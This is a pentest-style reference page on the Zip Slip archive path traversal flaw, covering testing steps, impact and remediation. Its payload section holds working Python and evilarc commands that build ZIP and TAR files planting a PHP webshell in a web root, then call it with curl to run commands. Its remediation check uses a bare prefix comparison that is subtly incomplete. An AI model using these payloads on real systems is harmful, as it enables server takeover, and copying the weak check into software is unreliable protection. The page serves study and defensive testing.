# Zip Slip

## Overview
Zip Slip is a path traversal vulnerability that occurs during the extraction of archive files (ZIP, TAR, JAR, WAR, GZIP). Maliciously crafted archives contain entries with filenames like `../../evil.php` that, when extracted, write files outside the intended extraction directory. First published by Snyk in 2018, it affects hundreds of open-source libraries across Java, JavaScript, Ruby, Python, Go, and PHP.

## How It Works
- Archive extraction code iterates over archive entries and writes each entry's content to `outputDir + entry.name`.
- A crafted archive contains an entry named `../../../../var/www/html/shell.php`.
- Without canonicalization checks, the extraction writes the file to the web root.
- The archive appears benign (correct file extension, valid structure) but contains the traversal entries.

## Impact
- Remote code execution by writing a webshell to a web-accessible directory.
- Overwrite of configuration files, SSH authorized keys, cron jobs.
- Data corruption by overwriting legitimate application files.
- Privilege escalation if extraction runs with elevated permissions.

## Where to Look
- Features that accept ZIP, TAR, JAR, WAR, GZIP, TGZ, BZ2 uploads.
- Plugin/theme upload mechanisms in CMS platforms (WordPress, Drupal, Magento).
- Import/export features that accept archive files.
- Deployment pipelines that unzip user-uploaded packages.
- Java application servers unpacking WAR/JAR files.

## Testing Steps
1. Find any upload feature that accepts archive files.
2. Create a malicious ZIP using the evilarc tool or Python zipfile module.
3. Include an entry with a traversal path: `../../../../../../tmp/pwned.txt`.
4. Upload the archive and check if the file appears in the traversal destination.
5. Escalate: create entry pointing to web root: `../../var/www/html/shell.php`.
6. Try with TAR archives as well (TAR has no built-in path sanitization either).
7. After upload, access `https://target.com/shell.php?cmd=id` to verify RCE.

## Payloads / Techniques
```python
# Create malicious ZIP with Python
import zipfile
import os

with zipfile.ZipFile("evil.zip", "w") as zf:
    # Traversal entry
    zf.writestr("../../../var/www/html/shell.php",
                "<?php system($_GET['cmd']); ?>")

# Create malicious TAR
import tarfile
t = tarfile.open("evil.tar", "w:gz")
info = tarfile.TarInfo(name="../../../var/www/html/shell.php")
import io
data = b"<?php system($_GET['cmd']); ?>"
info.size = len(data)
t.addfile(info, io.BytesIO(data))
t.close()
```

```bash
# Using evilarc
git clone https://github.com/ptoomey3/evilarc
python evilarc.py shell.php -o unix -d 5 -p var/www/html/ -f evil.zip

# Check if traversal file was written
curl https://target.com/shell.php?cmd=id
```

## Burp Suite Tips
- Intercept the archive upload in **Repeater**.
- After uploading the malicious archive, use Repeater to test if the traversal file is accessible.
- No specific Burp extension — manual creation of the malicious archive is required.

## Tools
- evilarc — https://github.com/ptoomey3/evilarc (malicious archive generator)
- Python `zipfile` / `tarfile` modules
- zip (command line) for manual creation

## Remediation
- After resolving the full extraction path, verify it starts with the intended output directory:
  ```python
  if not os.path.realpath(dest_path).startswith(os.path.realpath(output_dir)):
      raise Exception("Zip Slip detected")
  ```
- Use a patched version of archive libraries (most popular libraries have been patched since 2018).
- Run extraction in a sandboxed environment with restricted filesystem access.
- Reject archive entries with absolute paths or `..` path components.

## References
https://snyk.io/research/zip-slip-vulnerability
https://portswigger.net/web-security/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://github.com/snyk/zip-slip-vulnerability
